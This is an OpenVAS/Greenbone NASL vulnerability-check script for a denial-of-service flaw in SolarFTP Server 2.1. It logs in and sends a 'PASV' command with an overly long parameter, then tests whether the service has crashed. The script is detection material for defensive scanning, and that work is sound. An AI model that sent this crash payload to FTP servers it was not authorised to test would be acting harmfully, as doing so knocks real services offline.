# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802002");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("SolarFTP PASV Command Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/solarftp/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/42834/");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/Solar.FTP.Server.2.1.Buffer.Overflow/77");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause a denial
  of service.");

  script_tag(name:"affected", value:"Flexbyte Software Solar FTP Server 2.1, other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is due to an error while parsing 'PASV' command, which
  can be exploited to crash the FTP service by sending 'PASV' command with
  an overly long parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"SolarFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "Solar FTP Server" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin){
  exit(0);
}

send(socket:soc1, data:string("PASV ", crap(length: 100, data:"A"), '\r\n'));

close(soc1);

sleep (3);

soc2 = open_sock_tcp(ftpPort);
if(!soc2){
  security_message(ftpPort);
  exit(0);
}

resp = recv_line(socket:soc2, length:260);

if("Solar FTP Server" >!< resp){
  security_message(ftpPort);
}

ftp_close(socket:soc2);
